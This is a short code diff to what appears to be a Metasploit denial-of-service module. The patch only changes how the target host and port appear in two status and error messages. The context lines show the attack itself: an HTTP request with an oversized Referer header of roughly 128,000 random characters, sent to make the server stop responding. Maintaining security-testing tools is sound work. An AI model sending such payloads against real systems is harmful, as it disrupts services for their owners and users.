@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     connect
-    print_status("Sending DoS packet to #{rhost}:#{rport}")
+    print_status("Sending DoS packet to #{Rex::Socket.to_authority(rhost, rport)}")
 
     sploit = "GET / HTTP/1.0\r\n"
     sploit << 'Referer: ' + Rex::Text.rand_text_alpha(1) * 128000
@@ -51,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
     disconnect
     print_error('DoS packet unsuccessful')
   rescue ::Rex::ConnectionRefused
-    print_error("Unable to connect to #{rhost}:#{rport}")
+    print_error("Unable to connect to #{Rex::Socket.to_authority(rhost, rport)}")
   rescue ::Errno::ECONNRESET
     print_good("DoS packet successful. #{rhost} not responding.")
   end
